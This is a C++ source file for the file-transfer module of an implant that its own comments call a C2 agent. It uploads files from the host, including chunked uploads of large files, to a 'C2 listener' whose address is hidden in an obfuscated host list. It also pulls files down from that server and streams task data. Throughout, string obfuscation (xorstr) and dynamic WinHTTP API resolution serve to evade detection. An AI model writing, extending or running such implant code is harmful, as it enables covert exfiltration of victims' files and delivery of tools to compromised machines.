// ========================================== { START OF FILE } ========================================== //
// File Transfer: upload local files to server, download files from server.
// Uses WinHTTP for HTTP(S) communication.
//
// Upload: agent sends file to server.
// POST /api/files/{agentKey}/{fileName}/file with file contents.
//
// Download: the server rewrites a DOWNLOAD task into a chunk payload (Command.Data carrying the
// base64 bytes at Command.Offset); the agent writes each chunk at its offset. A task the server
// did not rewrite falls back to fetching the whole file.
//
// Ref: clean/test Agent/src/FileTransfer.cpp (commits 2bf3048, ffaed03) — SendFile's 100 MB
// threshold and 10 MB chunks, SendStreamData's stream post; and Agent::DownloadFile (Agent.cpp)
// for the offset/append handling. The reference used libcurl; this tree resolves WinHTTP by hash
// and keeps the same endpoints and chunk geometry.

#include "agent/commands/exec/filetransfer.h"

#include "agent/transport/comm_manager.h"
#include "agent/util/api_resolver.h"
#include "agent/util/strings.h"
#include "base64.hpp"

#include <fstream>
#include <sstream>
#include <vector>

#ifdef _WIN32
#include <windows.h>
#include <winhttp.h>
#endif

#include "xorstr/xorstr.hpp"

namespace agent::commands::exec {

    namespace {

#ifdef _WIN32

        /// Files below this size are sent in one request; at or above it the reference streams
        /// 10 MB chunks and asks the server to rebuild them.
        constexpr long long kChunkThresholdBytes = 100LL * 1024 * 1024;
        constexpr std::size_t kChunkSizeBytes = 10 * 1024 * 1024;

        // WinHTTP function pointer types
        using WinHttpOpenPtr = decltype(&WinHttpOpen);
        using WinHttpCrackUrlPtr = decltype(&WinHttpCrackUrl);
        using WinHttpCloseHandlePtr = decltype(&WinHttpCloseHandle);
        using WinHttpConnectPtr = decltype(&WinHttpConnect);
        using WinHttpOpenRequestPtr = decltype(&WinHttpOpenRequest);
        using WinHttpSendRequestPtr = decltype(&WinHttpSendRequest);
        using WinHttpReceiveResponsePtr = decltype(&WinHttpReceiveResponse);
        using WinHttpQueryHeadersPtr = decltype(&WinHttpQueryHeaders);
        using WinHttpQueryDataAvailablePtr = decltype(&WinHttpQueryDataAvailable);
        using WinHttpReadDataPtr = decltype(&WinHttpReadData);

        // Send HTTP POST request with file contents
        /// Base URL for the C2 listener: http://<first host from COMM_HOSTS_LIST>:<COMM_PORT>.
        [[nodiscard]] std::string C2BaseUrl() {
            std::string hosts = xorstr_(COMM_HOSTS_LIST);
            const std::size_t separator = hosts.find(';');
            if (separator != std::string::npos) {
                hosts = hosts.substr(0, separator);
            }

            std::ostringstream port_stream;
            port_stream << COMM_PORT;

            return xorstr_("http://") + hosts + ":" + port_stream.str();
        }

        /// POSTs raw bytes to `url` and reports success only on a 2xx status.
        bool PostBytes(const std::string& url, const char* data, std::size_t size) {
            const HMODULE winhttp = agent::util::get_module(xorstr_("winhttp.dll"));
            if (winhttp == nullptr) return false;

            const WinHttpOpenPtr winhttp_open =
                agent::util::resolve_api<WinHttpOpenPtr>(winhttp, xorstr_("WinHttpOpen"));
            const WinHttpCrackUrlPtr winhttp_crack_url =
                agent::util::resolve_api<WinHttpCrackUrlPtr>(winhttp, xorstr_("WinHttpCrackUrl"));
            const WinHttpCloseHandlePtr winhttp_close_handle =
                agent::util::resolve_api<WinHttpCloseHandlePtr>(winhttp, xorstr_("WinHttpCloseHandle"));
            const WinHttpConnectPtr winhttp_connect =
                agent::util::resolve_api<WinHttpConnectPtr>(winhttp, xorstr_("WinHttpConnect"));
            const WinHttpOpenRequestPtr winhttp_open_request =
                agent::util::resolve_api<WinHttpOpenRequestPtr>(winhttp, xorstr_("WinHttpOpenRequest"));
            const WinHttpSendRequestPtr winhttp_send_request =
                agent::util::resolve_api<WinHttpSendRequestPtr>(winhttp, xorstr_("WinHttpSendRequest"));
            const WinHttpReceiveResponsePtr winhttp_receive_response =
                agent::util::resolve_api<WinHttpReceiveResponsePtr>(winhttp, xorstr_("WinHttpReceiveResponse"));
            const WinHttpQueryHeadersPtr winhttp_query_headers =
                agent::util::resolve_api<WinHttpQueryHeadersPtr>(winhttp, xorstr_("WinHttpQueryHeaders"));

            if (winhttp_open == nullptr || winhttp_crack_url == nullptr || winhttp_close_handle == nullptr ||
                winhttp_connect == nullptr || winhttp_open_request == nullptr || winhttp_send_request == nullptr ||
                winhttp_receive_response == nullptr || winhttp_query_headers == nullptr) {
                return false;
            }

            HINTERNET hSession =
                winhttp_open(agent::util::ToWide(xorstr_(COMM_USER_AGENT)).c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                             WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
            if (hSession == nullptr) return false;

            // WinHttpCrackUrl only fills the components whose *Length member is set to (DWORD)-1,
            // and the returned pointers are not null-terminated: copy them out with their length.
            URL_COMPONENTS uc{};
            uc.dwStructSize = sizeof(uc);
            uc.dwSchemeLength = static_cast<DWORD>(-1);
            uc.dwHostNameLength = static_cast<DWORD>(-1);
            uc.dwUrlPathLength = static_cast<DWORD>(-1);

            const std::wstring wurl(url.begin(), url.end());
            if (!winhttp_crack_url(wurl.c_str(), 0, 0, &uc)) {
                winhttp_close_handle(hSession);
                return false;
            }

            const std::wstring host_name(uc.lpszHostName, uc.dwHostNameLength);
            HINTERNET hConnect = winhttp_connect(hSession, host_name.c_str(), uc.nPort,
                                                 uc.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
            if (hConnect == nullptr) {
                winhttp_close_handle(hSession);
                return false;
            }

            const std::wstring url_path(uc.lpszUrlPath, uc.dwUrlPathLength);
            HINTERNET hRequest = winhttp_open_request(hConnect, L"POST", url_path.c_str(), nullptr, WINHTTP_NO_REFERER,
                                                      WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (hRequest == nullptr) {
                winhttp_close_handle(hConnect);
                winhttp_close_handle(hSession);
                return false;
            }

            // Keep the wide string alive: ToWide() returns a temporary std::wstring, so
            // calling .c_str() on it and storing the pointer would leave it dangling.
            // dwHeadersLength is documented as a length in *characters*, not bytes:
            // https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpsendrequest
            const std::wstring content_type = agent::util::ToWide(xorstr_("Content-Type: application/octet-stream"));
            const DWORD body_size = static_cast<DWORD>(size);
            winhttp_send_request(hRequest, content_type.c_str(), (DWORD)content_type.size(),
                                 size == 0 ? WINHTTP_NO_REQUEST_DATA : const_cast<char*>(data), body_size, body_size,
                                 0);

            BOOL success = winhttp_receive_response(hRequest, nullptr);

            DWORD statusCode = 0;
            if (success) {
                DWORD statusSize = sizeof(statusCode);
                winhttp_query_headers(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                      WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
            }

            winhttp_close_handle(hRequest);
            winhttp_close_handle(hConnect);
            winhttp_close_handle(hSession);

            return success && statusCode >= 200 && statusCode < 300;
        }

        bool PostFile(const std::string& url, const std::string& filePath) {
            std::ifstream file(filePath, std::ios::binary);
            if (!file) return false;

            file.seekg(0, std::ios::end);
            const long long fileSize = file.tellg();
            file.seekg(0, std::ios::beg);
            if (fileSize < 0) return false;

            std::vector<char> fileData(static_cast<std::size_t>(fileSize));
            if (!fileData.empty()) {
                file.read(fileData.data(), fileSize);
                if (!file) return false;
            }

            return PostBytes(url, fileData.empty() ? nullptr : fileData.data(), fileData.size());
        }

        /// Larger files: POST each 10 MB chunk to `.../{transferId}/chunks/{n}`, then ask the server
        /// to rebuild them. Returns the number of chunks sent (0 on failure at any stage).
        [[nodiscard]] int PostFileInChunks(const std::string& filePath, const std::string& transferUrl) {
            std::ifstream file(filePath, std::ios::binary);
            if (!file) return 0;

            std::vector<char> buffer(kChunkSizeBytes);
            int chunkNumber = 0;

            while (file.read(buffer.data(), static_cast<std::streamsize>(buffer.size())) || file.gcount() > 0) {
                const auto count = file.gcount();
                if (count <= 0) break;

                const std::string chunk_url = transferUrl + xorstr_("/chunks/") + std::to_string(chunkNumber++);
                if (!PostBytes(chunk_url, buffer.data(), static_cast<std::size_t>(count))) {
                    return 0;
                }
            }

            // Rebuilding is a separate request so the server can tell a partial upload from a
            // finished one.
            if (!PostBytes(transferUrl + xorstr_("/rebuild"), nullptr, 0)) {
                return 0;
            }

            return chunkNumber;
        }

        // Download file from URL and save to local path
        bool DownloadFile(const std::string& url, const std::string& filePath) {
            const HMODULE winhttp = agent::util::get_module(xorstr_("winhttp.dll"));
            if (winhttp == nullptr) return false;

            const WinHttpOpenPtr winhttp_open =
                agent::util::resolve_api<WinHttpOpenPtr>(winhttp, xorstr_("WinHttpOpen"));
            const WinHttpCrackUrlPtr winhttp_crack_url =
                agent::util::resolve_api<WinHttpCrackUrlPtr>(winhttp, xorstr_("WinHttpCrackUrl"));
            const WinHttpCloseHandlePtr winhttp_close_handle =
                agent::util::resolve_api<WinHttpCloseHandlePtr>(winhttp, xorstr_("WinHttpCloseHandle"));
            const WinHttpConnectPtr winhttp_connect =
                agent::util::resolve_api<WinHttpConnectPtr>(winhttp, xorstr_("WinHttpConnect"));
            const WinHttpOpenRequestPtr winhttp_open_request =
                agent::util::resolve_api<WinHttpOpenRequestPtr>(winhttp, xorstr_("WinHttpOpenRequest"));
            const WinHttpSendRequestPtr winhttp_send_request =
                agent::util::resolve_api<WinHttpSendRequestPtr>(winhttp, xorstr_("WinHttpSendRequest"));
            const WinHttpReceiveResponsePtr winhttp_receive_response =
                agent::util::resolve_api<WinHttpReceiveResponsePtr>(winhttp, xorstr_("WinHttpReceiveResponse"));
            const WinHttpQueryHeadersPtr winhttp_query_headers =
                agent::util::resolve_api<WinHttpQueryHeadersPtr>(winhttp, xorstr_("WinHttpQueryHeaders"));
            const WinHttpQueryDataAvailablePtr winhttp_query_data_available =
                agent::util::resolve_api<WinHttpQueryDataAvailablePtr>(winhttp, xorstr_("WinHttpQueryDataAvailable"));
            const WinHttpReadDataPtr winhttp_read_data =
                agent::util::resolve_api<WinHttpReadDataPtr>(winhttp, xorstr_("WinHttpReadData"));

            if (winhttp_open == nullptr || winhttp_crack_url == nullptr || winhttp_close_handle == nullptr ||
                winhttp_connect == nullptr || winhttp_open_request == nullptr || winhttp_send_request == nullptr ||
                winhttp_receive_response == nullptr || winhttp_query_headers == nullptr ||
                winhttp_query_data_available == nullptr || winhttp_read_data == nullptr) {
                return false;
            }

            HINTERNET hSession =
                winhttp_open(agent::util::ToWide(xorstr_(COMM_USER_AGENT)).c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                             WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
            if (hSession == nullptr) return false;

            // WinHttpCrackUrl only fills the components whose *Length member is set to (DWORD)-1,
            // and the returned pointers are not null-terminated: copy them out with their length.
            URL_COMPONENTS uc{};
            uc.dwStructSize = sizeof(uc);
            uc.dwSchemeLength = static_cast<DWORD>(-1);
            uc.dwHostNameLength = static_cast<DWORD>(-1);
            uc.dwUrlPathLength = static_cast<DWORD>(-1);

            const std::wstring wurl(url.begin(), url.end());
            if (!winhttp_crack_url(wurl.c_str(), 0, 0, &uc)) {
                winhttp_close_handle(hSession);
                return false;
            }

            const std::wstring host_name(uc.lpszHostName, uc.dwHostNameLength);
            HINTERNET hConnect = winhttp_connect(hSession, host_name.c_str(), uc.nPort,
                                                 uc.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
            if (hConnect == nullptr) {
                winhttp_close_handle(hSession);
                return false;
            }

            const std::wstring url_path(uc.lpszUrlPath, uc.dwUrlPathLength);
            HINTERNET hRequest = winhttp_open_request(hConnect, L"GET", url_path.c_str(), nullptr, WINHTTP_NO_REFERER,
                                                      WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (hRequest == nullptr) {
                winhttp_close_handle(hConnect);
                winhttp_close_handle(hSession);
                return false;
            }

            winhttp_send_request(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

            BOOL success = winhttp_receive_response(hRequest, nullptr);

            DWORD statusCode = 0;
            if (success) {
                DWORD statusSize = sizeof(statusCode);
                winhttp_query_headers(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                      WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
            }

            bool downloaded = false;
            if (success && statusCode >= 200 && statusCode < 300) {
                std::ofstream file(filePath, std::ios::binary);
                if (file) {
                    DWORD bytesAvailable = 0;
                    while (winhttp_query_data_available(hRequest, &bytesAvailable) && bytesAvailable > 0) {
                        std::vector<char> chunk(bytesAvailable);
                        DWORD bytesRead = 0;
                        if (winhttp_read_data(hRequest, chunk.data(), bytesAvailable, &bytesRead)) {
                            file.write(chunk.data(), bytesRead);
                        }
                        if (bytesRead == 0) break;
                    }
                    file.close();
                    downloaded = true;
                }
            }

            winhttp_close_handle(hRequest);
            winhttp_close_handle(hConnect);
            winhttp_close_handle(hSession);

            return downloaded;
        }

        /// The session UUID the server keys a transfer by. The payload UUID is only correct before
        /// the first check-in; sending it makes the server's lookup miss (the listener still answers
        /// 200, so the failure is silent).
        [[nodiscard]] std::string AgentKey() {
            std::string agent_key = agent::transport::CurrentSessionUuid();
            if (agent_key.empty()) {
                agent_key = COMM_PAYLOAD_UUID;
            }
            return agent_key;
        }

        /// File name component of a Windows path.
        [[nodiscard]] std::string BaseName(const std::string& path) {
            const std::size_t last_slash = path.find_last_of("\\/");
            return last_slash == std::string::npos ? path : path.substr(last_slash + 1);
        }

#endif  // _WIN32

    }  // namespace

    bool PostStreamData(const std::string& stream_id, const std::string& data) {
#ifdef _WIN32
        // Ref: FileTransfer::SendStreamData on clean/test. The stream is keyed by the session UUID
        // (the server resolves the campaign from it) and by the task id; each post appends.
        const std::string url =
            C2BaseUrl() + xorstr_("/api/streams/") + AgentKey() + "/" + stream_id + xorstr_("/data");
        return PostBytes(url, data.data(), data.size());
#else
        (void)stream_id;
        (void)data;
        return false;
#endif
    }

    CommandResult HandleUpload(const models::CheckinResponse& task) {
#ifdef _WIN32
        const std::string filePath = task.file_path;

        // The dispatcher rejects an incomplete command before it reaches this point; keep a
        // defensive guard so the exec entry point is honest when called directly.
        if (filePath.empty()) {
            return CommandResult::Error(xorstr_("Missing file path"));
        }

        const std::string filename = BaseName(filePath);
        const std::string agent_key = AgentKey();

        std::ifstream size_probe(filePath, std::ios::binary | std::ios::ate);
        if (!size_probe) {
            return CommandResult::Error(xorstr_("Upload failed: could not open ") + filePath);
        }
        const long long file_size = size_probe.tellg();
        size_probe.close();

        // Upload endpoint: /api/files/{agentKey}/{fileName}/file
        // agentKey is the session UUID issued at check-in (see AgentKey()).
        const std::string file_url =
            C2BaseUrl() + xorstr_("/api/files/") + agent_key + "/" + filename + xorstr_("/file");

        if (file_size < kChunkThresholdBytes) {
            if (PostFile(file_url, filePath)) {
                return CommandResult::Ok(xorstr_("Upload successful: ") + filename);
            }
            return CommandResult::Error(xorstr_("Upload failed: ") + filename);
        }

        // Chunked path: the transfer has to be identified, and the chunks and the rebuild share it.
        const std::string transfer_id = task.transfer_id.empty() ? std::to_string(task.id) : task.transfer_id;
        const std::string transfer_url = C2BaseUrl() + xorstr_("/api/files/") + agent_key + "/" + transfer_id;

        const int chunks = PostFileInChunks(filePath, transfer_url);
        if (chunks == 0) {
            return CommandResult::Error(xorstr_("Upload failed: chunked transfer of ") + filename);
        }

        return CommandResult::Ok(xorstr_("Upload successful: ") + filename + xorstr_(" (") + std::to_string(chunks) +
                                 xorstr_(" chunks reassembled by the server)"));
#else
        (void)task;
        return CommandResult::Error(xorstr_("File upload not implemented on this platform"));
#endif
    }

    CommandResult HandleDownload(const models::CheckinResponse& task) {
#ifdef _WIN32
        const std::string filePath = task.file_path;

        // See HandleUpload: the dispatcher validates first, this guard keeps the entry point honest.
        if (filePath.empty()) {
            return CommandResult::Error(xorstr_("Missing file path"));
        }

        // Chunked download: the server rewrites the task into Command.Data (base64 bytes) plus the
        // offset they belong at. Ref: Agent::DownloadFile on clean/test — offset 0 truncates the
        // destination, every later chunk appends.
        if (!task.chunk_data.empty() || task.chunk_total_bytes > 0) {
            const std::string bytes = base64::from_base64(task.chunk_data);

            std::ios::openmode mode = std::ios::binary;
            mode |= task.chunk_offset == 0 ? std::ios::trunc : std::ios::app;

            std::ofstream output(filePath, mode);
            if (!output) {
                return CommandResult::Error(xorstr_("Download failed: could not open ") + filePath);
            }

            if (!bytes.empty()) {
                output.write(bytes.data(), static_cast<std::streamsize>(bytes.size()));
            }
            output.close();

            if (!output) {
                return CommandResult::Error(xorstr_("Download failed: could not write chunk to ") + filePath);
            }

            const std::string progress = std::to_string(task.chunk_offset + static_cast<long long>(bytes.size())) +
                                         xorstr_("/") + std::to_string(task.chunk_total_bytes);
            return CommandResult::Ok(xorstr_("File chunk stored (") + progress + xorstr_(")") +
                                     (task.chunk_final ? xorstr_(" - transfer complete") : ""));
        }

        // Fallback: the server did not rewrite the task (for example the file was not staged), so
        // fetch the whole file. The reference monolith had no download path here at all.
        const std::string campaignId = task.transfer_id;
        if (campaignId.empty()) {
            return CommandResult::Error(xorstr_("Missing campaign ID for download"));
        }

        const std::string filename = BaseName(filePath);
        const std::string url = C2BaseUrl() + xorstr_("/api/files/") + campaignId + "/" + filename;

        if (DownloadFile(url, filePath)) {
            return CommandResult::Ok(xorstr_("Download successful: ") + filename);
        }
        return CommandResult::Error(xorstr_("Download failed: ") + filename);
#else
        (void)task;
        return CommandResult::Error(xorstr_("File download not implemented on this platform"));
#endif
    }

}  // namespace agent::commands::exec
   // ========================================== { END OF FILE } ========================================== //
